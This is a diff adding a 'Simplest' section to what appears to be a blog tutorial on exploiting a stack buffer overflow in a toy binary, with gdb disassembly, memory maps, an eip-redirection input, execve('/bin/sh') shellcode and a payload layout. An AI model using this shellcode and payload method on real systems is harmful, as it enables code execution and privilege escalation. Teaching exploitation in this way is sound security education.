@@ -192,6 +192,133 @@ void access() {
 }
 ```
 
+## Simplest
+
+```
+Dump of assembler code for function main:
+   0x565561bd <+0>:     lea    ecx,[esp+0x4]
+   0x565561c1 <+4>:     and    esp,0xfffffff0
+   0x565561c4 <+7>:     push   DWORD PTR [ecx-0x4]
+   0x565561c7 <+10>:    push   ebp
+   0x565561c8 <+11>:    mov    ebp,esp
+   0x565561ca <+13>:    push   ebx
+   0x565561cb <+14>:    push   ecx
+   0x565561cc <+15>:    sub    esp,0x20
+   0x565561cf <+18>:    call   0x565560c0 <__x86.get_pc_thunk.bx>
+   0x565561d4 <+23>:    add    ebx,0x2e2c
+   0x565561da <+29>:    sub    esp,0xc
+   0x565561dd <+32>:    lea    eax,[ebx-0x1ff8]
+   0x565561e3 <+38>:    push   eax
+   0x565561e4 <+39>:    call   0x56556040 <printf@plt>
+   0x565561e9 <+44>:    add    esp,0x10
+   0x565561ec <+47>:    sub    esp,0x8
+   0x565561ef <+50>:    lea    eax,[ebp-0x28]
+   0x565561f2 <+53>:    push   eax
+   0x565561f3 <+54>:    lea    eax,[ebx-0x1fe5]
+   0x565561f9 <+60>:    push   eax
+   0x565561fa <+61>:    call   0x56556060 <__isoc99_scanf@plt>
+   0x565561ff <+66>:    add    esp,0x10
+   0x56556202 <+69>:    sub    esp,0x8
+   0x56556205 <+72>:    lea    eax,[ebp-0x28]
+   0x56556208 <+75>:    push   eax
+   0x56556209 <+76>:    lea    eax,[ebx-0x1fe2]
+   0x5655620f <+82>:    push   eax
+   0x56556210 <+83>:    call   0x56556040 <printf@plt>
+   0x56556215 <+88>:    add    esp,0x10
+   0x56556218 <+91>:    mov    eax,0x0
+   0x5655621d <+96>:    lea    esp,[ebp-0x8]
+   0x56556220 <+99>:    pop    ecx
+   0x56556221 <+100>:   pop    ebx
+   0x56556222 <+101>:   pop    ebp
+   0x56556223 <+102>:   lea    esp,[ecx-0x4]
+=> 0x56556226 <+105>:   ret    
+End of assembler dump.
+```
+
+0xffffcb70 is the address of the ``name`` buffer
+
+```
+gef➤  info proc mappings 
+process 24102
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x804b000     0x3000        0x0 /opt/gipi.github.io/public/code/simplest_excalation
+         0x804b000  0x804c000     0x1000     0x2000 /opt/gipi.github.io/public/code/simplest_excalation
+         0x804c000  0x804d000     0x1000     0x3000 /opt/gipi.github.io/public/code/simplest_excalation
+        0xf7d8d000 0xf7da6000    0x19000        0x0 /lib/i386-linux-gnu/libc-2.27.so
+        0xf7da6000 0xf7f60000   0x1ba000    0x19000 /lib/i386-linux-gnu/libc-2.27.so
+        0xf7f60000 0xf7f61000     0x1000   0x1d3000 /lib/i386-linux-gnu/libc-2.27.so
+        0xf7f61000 0xf7f63000     0x2000   0x1d3000 /lib/i386-linux-gnu/libc-2.27.so
+        0xf7f63000 0xf7f64000     0x1000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
+        0xf7f64000 0xf7f67000     0x3000        0x0 
+        0xf7fce000 0xf7fd0000     0x2000        0x0 
+        0xf7fd0000 0xf7fd3000     0x3000        0x0 [vvar]
+        0xf7fd3000 0xf7fd5000     0x2000        0x0 [vdso]
+        0xf7fd5000 0xf7fd6000     0x1000        0x0 /lib/i386-linux-gnu/ld-2.27.so
+        0xf7fd6000 0xf7ffb000    0x25000     0x1000 /lib/i386-linux-gnu/ld-2.27.so
+        0xf7ffc000 0xf7ffd000     0x1000    0x26000 /lib/i386-linux-gnu/ld-2.27.so
+        0xf7ffd000 0xf7ffe000     0x1000    0x27000 /lib/i386-linux-gnu/ld-2.27.so
+        0xfffdc000 0xffffe000    0x22000        0x0 [stack]
+gef➤  shell cat /proc/24102/maps
+08048000-0804b000 r-xp 00000000 08:11 6696246                            /opt/gipi.github.io/public/code/simplest_excalation
+0804b000-0804c000 r-xp 00002000 08:11 6696246                            /opt/gipi.github.io/public/code/simplest_excalation
+0804c000-0804d000 rwxp 00003000 08:11 6696246                            /opt/gipi.github.io/public/code/simplest_excalation
+f7d8d000-f7da6000 r-xp 00000000 08:01 6029622                            /lib/i386-linux-gnu/libc-2.27.so
+f7da6000-f7f60000 r-xp 00019000 08:01 6029622                            /lib/i386-linux-gnu/libc-2.27.so
+f7f60000-f7f61000 ---p 001d3000 08:01 6029622                            /lib/i386-linux-gnu/libc-2.27.so
+f7f61000-f7f63000 r-xp 001d3000 08:01 6029622                            /lib/i386-linux-gnu/libc-2.27.so
+f7f63000-f7f64000 rwxp 001d5000 08:01 6029622                            /lib/i386-linux-gnu/libc-2.27.so
+f7f64000-f7f67000 rwxp 00000000 00:00 0 
+f7fce000-f7fd0000 rwxp 00000000 00:00 0 
+f7fd0000-f7fd3000 r--p 00000000 00:00 0                                  [vvar]
+f7fd3000-f7fd5000 r-xp 00000000 00:00 0                                  [vdso]
+f7fd5000-f7fd6000 r-xp 00000000 08:01 6029408                            /lib/i386-linux-gnu/ld-2.27.so
+f7fd6000-f7ffb000 r-xp 00001000 08:01 6029408                            /lib/i386-linux-gnu/ld-2.27.so
+f7ffc000-f7ffd000 r-xp 00026000 08:01 6029408                            /lib/i386-linux-gnu/ld-2.27.so
+f7ffd000-f7ffe000 rwxp 00027000 08:01 6029408                            /lib/i386-linux-gnu/ld-2.27.so
+fffdc000-ffffe000 rwxp 00000000 00:00 0                                  [stack]
+```
+
+first ``eip`` redirection
+
+```
+gef➤  r < <(python -c "print '\x74\xcb\xff\xff' + '\xcc'*28 + '\x74\xcb\xff\xff'" )
+```
+
+```
+$ shellcraft i386.linux.sh -f a
+    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
+    /* push '/bin///sh\x00' */
+    push 0x68
+    push 0x732f2f2f
+    push 0x6e69622f
+    mov ebx, esp
+    /* push argument array ['sh\x00'] */
+    /* push 'sh\x00\x00' */
+    push 0x1010101
+    xor dword ptr [esp], 0x1016972
+    xor ecx, ecx
+    push ecx /* null terminate */
+    push 4
+    pop ecx
+    add ecx, esp
+    push ecx /* 'sh\x00' */
+    mov ecx, esp
+    xor edx, edx
+    /* call execve() */
+    push SYS_execve /* 0xb */
+    pop eax
+    int 0x80
+```
+
+the payload organization would be
+
+```
+[addr shellcode][     padding     ][addr start buffer][ shellcode ]
+                '--- 28 bytes  ---'
+```
+
 ## Summary
 
 > Insecurity is about computation
